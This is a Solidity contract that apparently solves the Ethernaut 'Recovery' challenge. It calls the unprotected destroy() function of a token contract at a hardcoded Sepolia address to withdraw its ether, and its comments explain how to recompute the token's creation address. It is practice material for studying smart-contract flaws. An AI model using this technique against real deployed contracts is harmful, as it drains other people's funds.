//SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

import {Recovery, SimpleToken} from "Ethernaut_Recovery/Recovery.sol";

contract attack {
    Recovery target;
    constructor(address _target) {
        target = Recovery(_target);
    }

    function attackContract() public {
        SimpleToken(payable(address(0xACcE5Ad336B34Da1252737B7b40df2Fa4e10fE02))).destroy(payable(tx.origin));
    } 
    //i found the contract address by browsing in sepolia etherscan of the instance address which has an internal transaction with 0.001 ETH sent to the  above hardcoded address

    //you can also find the deployed address manually by using the given formula that solidity uses to compute the deploy address
    //address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01))))));
    //this formula uses sets nonce as 1, finds keccak hash of the RLP encoded value of (creator's address, creator's nonce) and then takes the last 20 bytes of the hashed value 
} 